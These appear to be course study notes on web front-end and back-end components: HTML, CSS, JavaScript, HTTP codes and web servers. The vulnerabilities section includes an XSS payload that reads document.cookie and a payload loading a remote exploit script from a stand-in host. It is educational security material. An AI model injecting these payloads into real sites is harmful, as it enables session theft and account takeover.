# Front End Components:

# HTML

The first and most dominant component of the front end of web applications is **HTML (HyperText Markup Language)**. HTML is at the very core of any web page we see on the internet. It contains each page's basic elements, including titles, forms, images, and many other elements. The web browser interprets these elements and displays them to the end-user.

---

## Basic HTML Example

The following is a very basic example of an HTML page:


    <!DOCTYPE html>
    <html>
        <head>
            <title>Page Title</title>
        </head>
        <body>
            <h1>A Heading</h1>
            <p>A Paragraph</p>
        </body>
    </html>

## Output

- Page title: Page Title

- URL: www.example.com

- Heading: A Heading

- Paragraph: A Paragraph

## HTML Structure (Tree View)
HTML elements are displayed in a tree structure, similar to XML:

    
    HTML document
     └── html
         ├── head
         │   └── title
         └── body
             ├── h1
             └── p

Each element can contain other HTML elements. The main <html> tag contains all page elements and exists under the document, distinguishing HTML from other document types such as XML.

## HTML Elements Explained
The elements from the example above can be represented as:

    html
    Copy code
    <html>
        <head>
            <title>Page Title</title>
        </head>
        <body>
            <h1>A Heading</h1>
            <p>A Paragraph</p>
        </body>
    </html>

Each HTML element consists of:

- Opening tag

- Content

- Closing tag

### Example

    <p>A Paragraph</p>

Tags may also contain attributes such as id or class:

    <p id="para1">Example paragraph</p>
    <p class="red-paragraphs">Another paragraph</p>

The tag and its content together form a complete HTML element.

## URL Encoding
URL Encoding (also called percent-encoding) is an important concept in HTML.

- Browsers can only use ASCII characters in URLs

- Non-ASCII characters must be encoded

- Unsafe characters are replaced with % followed by two hexadecimal digits


### Examples

-  ' → %27

- Space → + or %20

## Common URL Encodings

    Character            	Encoding
    space	                %20
    !	                    %21
    "	                    %22
    #	                    %23
    $                    	%24
    %                    	%25
    &	                    %26
    '                    	%27
    (                    	%28
    )                    	%29

A full URL encoding table can be found online.

Many tools can perform URL encoding and decoding, including online encoders and Burp Suite, which provides built-in encoding and decoding features.

## Usage of HTML Elements

    <head>
Contains metadata not directly displayed on the page (e.g. title, styles, scripts).

    <body>
Contains visible page content.

Other important elements include:

- <style> – contains CSS code

- <script> – contains JavaScript code

### Document Object Model (DOM)

Each HTML element is part of the Document Object Model (DOM).

The World Wide Web Consortium (W3C) defines the DOM as:

“The W3C Document Object Model (DOM) is a platform and language-neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document.”

## DOM Standards
The DOM is divided into three main parts:

- Core DOM – Standard model for all document types

- XML DOM – Standard model for XML documents

- HTML DOM – Standard model for HTML documents

From the tree structure, elements can be referenced as:


    document.head
    document.body
    document.h1

## Why DOM Understanding Matters
Understanding the HTML DOM structure helps to:

- Locate elements in source code

- Debug layout and rendering issues

- Identify elements by:

    - id
    - class name


# Cascading Style Sheets (CSS)

**CSS (Cascading Style Sheets)** is the stylesheet language used alongside HTML to format and style HTML elements. Like HTML, CSS has multiple versions, and each new version introduces additional capabilities for styling web pages. Web browsers are updated to support these new features as they are introduced.

---

## Example

At a fundamental level, CSS is used to define the style of each class or type of HTML element (e.g., `body` or `h1`). Any element on the page that matches a rule will be styled according to the CSS definition.

This can include:

- Font family  
- Font size  
- Background color  
- Text color  
- Text alignment  
- And more  

### CSS Code Example


        body {
          background-color: black;
        }
        
        h1 {
          color: white;
          text-align: center;
        }
        
        p {
          font-family: helvetica;
          font-size: 10px;
        }

As previously mentioned, this is why unique IDs or class names are often assigned to HTML elements—so they can later be referenced in CSS or JavaScript.

## Syntax
CSS defines the style of HTML elements or classes using curly brackets {}. Inside these brackets, properties are assigned values:


        element {
          property: value;
        }

Each HTML element has many properties that can be styled using CSS, such as:

- height,position,border,margin,padding,color,text-align,font-size

There are hundreds of available properties that can be combined to design visually appealing web pages.,Animations

CSS can also be used for advanced animations, ranging from simple movements to complex 3D effects. Common animation-related properties include:

- @keyframes,animation,animation-duration,animation-direction

These properties allow developers to create smooth and visually engaging animations without relying solely on JavaScript.

## Usage
CSS is often used alongside JavaScript to:

Perform quick calculations

Dynamically update style properties


This demonstrates that even though HTML and CSS are foundational web technologies, they can be used to build visually stunning and highly interactive web applications.

Extended Use Cases
CSS can also be used:

With other markup languages such as XML

Inside SVG elements

In modern mobile development platforms to design complete mobile application User Interfaces (UI)

## Frameworks
Some developers find CSS difficult or inefficient to manage at scale, especially when styling large applications. To address this, many CSS frameworks have been created. These frameworks provide pre-built stylesheets and components to speed up development.

CSS frameworks are typically:

Optimized for web applications

Designed to work seamlessly with JavaScript

Equipped with common UI components used in modern applications

Popular CSS Frameworks

- Bootstrap

- SASS

- Foundation

- Bulma

- Pure



# JavaScript

**JavaScript** is one of the most widely used programming languages in the world. It is primarily used in web and mobile development. JavaScript is commonly executed on the **front end** of applications within the web browser, but it is also used on the **back end** through environments such as **Node.js**, enabling the development of full-stack web applications.

While **HTML** and **CSS** define the structure and appearance of a web page, **JavaScript** controls its functionality and interactivity. Without JavaScript, most web pages would be largely static and offer minimal user interaction.

---

## Example

Within a web page, JavaScript code is loaded using the `<script>` tag:


    <script type="text/javascript">
      // JavaScript code
    </script>

A web page can also load external JavaScript files using the src attribute:


    <script src="./script.js"></script>

- Basic JavaScript Example

        document.getElementById("button1").innerHTML = "Changed Text!";

This example changes the content of the HTML element with the ID button1. When connected to a button click event, the text of the button dynamically updates based on user interaction.

As with HTML and CSS, there are many online platforms available to experiment with JavaScript. One popular example is JSFiddle, which allows developers to test and save JavaScript, CSS, and HTML code snippets.

JavaScript is a powerful and advanced language, and its syntax is more complex than HTML or CSS.

## Usage

Most common web applications heavily rely on JavaScript to drive all needed functionality on the web page, like updating the web page view in real-time, dynamically updating content in real-time, accepting and processing user input, and many other potential functionalities.

JavaScript is also used to automate complex processes and perform HTTP requests to interact with back-end systems using technologies such as AJAX.

In addition, JavaScript is frequently used alongside CSS to create advanced animations that are not possible with CSS alone. Highly interactive and visually dynamic web pages are driven by JavaScript executing in the browser.

All modern web browsers include JavaScript engines capable of executing JavaScript code on the client side without requiring communication with the back-end server, making JavaScript fast and efficient for many tasks.

## Frameworks
As web applications become more advanced, it may be inefficient to use pure JavaScript to develop an entire web application from scratch. This is why a host of JavaScript frameworks have been introduced to improve the experience of web application development.

These platforms introduce libraries that make it very simple to re-create advanced functionalities, like user login and user registration, and they introduce new technologies based on existing ones, like the use of dynamically changing HTML code, instead of using static HTML code.

These platforms either use JavaScript as their programming language or use an implementation of JavaScript that compiles its code into JavaScript code.

Some of the most common front end JavaScript frameworks are:

- Angular

- React

- Vue

- jQuery

# Front End Vulnerabilities

# 1. Sensitive Data Exposure
All of the front end components we covered are interacted with on the client-side. Therefore, if they are attacked, they do not pose a direct threat to the core back end of the web application and usually will not lead to permanent damage. However, as these components are executed on the client-side, they put the end-user in danger of being attacked and exploited if they do have any vulnerabilities. If a front end vulnerability is leveraged to attack admin users, it could result in unauthorized access, access to sensitive data, service disruption, and more.

Although the majority of web application penetration testing is focused on back end components and their functionality, it is important also to test front end components for potential vulnerabilities, as these types of vulnerabilities can sometimes be utilized to gain access to sensitive functionality (i.e., an admin panel), which may lead to compromising the entire server.

Sensitive Data Exposure refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the source code of the web page or page source on the front end of web applications. This is the HTML source code of the application, not to be confused with the back end code that is typically only accessible on the server itself. We can view any website's page source in our browser by right-clicking anywhere on the page and selecting View Page Source from the pop-up menu. Sometimes a developer may disable right-clicking on a web application, but this does not prevent us from viewing the page source as we can merely type ctrl + u or view the page source through a web proxy such as Burp Suite. Let's take a look at the google.com page source. Right-click and choose View Page Source, and a new tab will open in our browser with the URL view-source:https://www.google.com/. Here we can see the HTML, JavaScript, and external links. Take a moment to browse the page source a bit.

# 2. HTML Injection

Another major aspect of front end security is validating and sanitizing accepted user input. In many cases, user input validation and sanitization is carried out on the back end. However, some user input would never make it to the back end in some cases and is completely processed and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front end and the back end.

HTML injection occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through JavaScript on the front end.

When a user has complete control of how their input will be displayed, they can submit HTML code, and the browser may display it as part of the page. This may include a malicious HTML code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.

Another example of HTML Injection is web page defacing. This consists of injecting new HTML code to change the web page's appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.

# 3.Cross-Site Scripting (XSS)

HTML Injection vulnerabilities can often be utilized to also perform Cross-Site Scripting (XSS) attacks by injecting JavaScript code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine. XSS is very similar to HTML Injection in practice. However, XSS involves the injection of JavaScript code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of XSS:

    Type	            Description
    Reflected XSS	    Occurs when user input is displayed on the page after processing (e.g., search result or error message).
    Stored XSS	        Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).
    DOM XSS	            Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).

In the example we saw for HTML Injection, there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to XSS attacks. We can try to inject the following DOM XSS JavaScript code as a payload, which should show us the cookie value for the current user:

        #"><img src=/ onerror=alert(document.cookie)>

# 4.Cross-Site Request Forgery (CSRF)

The third type of front end vulnerability that is caused by unfiltered user input is Cross-Site Request Forgery (CSRF). CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the JavaScript CSRF payload), the JavaScript code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:


        "><script src=//www.example.com/exploit.js></script>

# Back End Components

# 1.Back End Servers
A back-end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fit in the Data access layer.

## Software
The back end server contains the other 3 back end components:

- Web Server
- Database
- Development Framework
Diagram showing a back-end server running Linux and Windows, connected to a web server (Apache, NGINX, IIS), web application (PHP, C#, Java), and database (MySQL, MS SQL, Oracle).

Other software components on the back end server may include hypervisors, containers, and WAFs.

There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. Some common examples include:

        Combinations	    Components
        LAMP	            Linux, Apache, MySQL, and PHP.
        WAMP	            Windows, Apache, MySQL, and PHP.
        WINS            	Windows, IIS, .NET, and SQL Server
        MAMP	            macOS, Apache, MySQL, and PHP.
        XAMPP	            Cross-Platform, Apache, MySQL, and PHP/PERL.

We can find a comprehensive list of Web Solution Stacks in this article.

## Hardware
The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web application will be. As previously discussed in the Architecture section, many architectures, especially for huge web applications, are designed to distribute their load over many back end servers that collectively work together to perform the same tasks and deliver the web application to the end-user. Web applications do not have to run directly on a single back end server but may utilize data centers and cloud hosting services that provide virtual hosts for the web application.

--------------------

# 2.Web-servers

A web server is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser. Web servers usually run on TCP ports 80 or 443, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.

## Workflow
A typical web server accepts HTTP requests from the client-side, and responds with different HTTP responses and codes, like a code 200 OK response for a successful request, a code 404 NOT FOUND when requesting pages that do not exist, code 403 FORBIDDEN for requesting access to restricted pages, and so on.

<img width="996" height="528" alt="Screenshot From 2026-01-17 17-59-46" src="https://github.com/user-attachments/assets/04655f27-63c8-4984-be80-f3b5342db265" />

Diagram showing a web server handling requests and responses from three clients: smartphone, laptop, and monitor.

The following are some of the most common HTTP response codes:

        Code	                    Description
      
        - Successful responses	
        200 OK	                     The request has succeeded
        
        - Redirection messages	
        301 Moved Permanently	    The URL of the requested resource has been changed permanently
        302 Found	                The URL of the requested resource has been changed temporarily
        
        - Client error responses	
        400 Bad Request	            The server could not understand the request due to invalid syntax
        401 Unauthorized	        Unauthenticated attempt to access page
        403 Forbidden	            The client does not have access rights to the content
        404 Not Found	            The server can not find the requested resource
        405 Method Not Allowed	    The request method is known by the server but has been disabled and cannot be used
        408 Request Timeout	        This response is sent on an idle connection by some servers, even without any previous request by the client
        
        - Server error responses	
        500 Internal Server Error	The server has encountered a situation it doesn't know how to handle
        502 Bad Gateway	            The server, while working as a gateway to get a response needed to handle the request, received an invalid response
        504 Gateway Timeout	T        he server is acting as a gateway and cannot get a response in time



## Apache

Apache 'or httpd' is the most common web server on the internet, hosting more than 40% of all internet websites. Apache usually comes pre-installed in most Linux distributions and can also be installed on Windows and macOS servers.

Apache is usually used with PHP for web application development, but it also supports other languages like .Net, Python, Perl, and even OS languages like Bash through CGI. Users can install a wide variety of Apache modules to extend its functionality and support more languages. For example, to support serving PHP files, users must install PHP on the back end server, in addition to installing the mod_php module for Apache.

Apache is an open-source project, and community users can access its source code to fix issues and look for vulnerabilities. It is well-maintained and regularly patched against vulnerabilities to keep it safe against exploitation. Furthermore, it is very well documented, making using and configuring different parts of the webserver relatively easy. Apache is commonly used by startups and smaller companies, as it is straightforward to develop for. Still, some big companies utilize Apache, including:


## NGINX

NGINX is the second most common web server on the internet, hosting roughly 30% of all internet websites. NGINX focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes NGINX a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using NGINX.

NGINX is also free and open-source, which gives all the same benefits previously mentioned, like security and reliability. Some popular websites that utilize NGINX include:

Google	Facebook	Twitter	Cisco	Intel	Netflix	HackTheBox

## IIS

IIS (Internet Information Services) is the third most common web server on the internet, hosting around 15% of all internet web sites. IIS is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. IIS is usually used to host web applications developed for the Microsoft .NET framework, but can also be used to host web applications developed in other languages like PHP, or host other types of services like FTP. Furthermore, IIS is very well optimized for Active Directory integration and includes features like Windows Auth for authenticating users using Active Directory, allowing them to automatically sign in to web applications.

Though not the most popular web server, many big organizations use IIS as their web server. Many of them use Windows Server on their back end or rely heavily on Active Directory within their organization. Some popular websites that utilize IIS include:
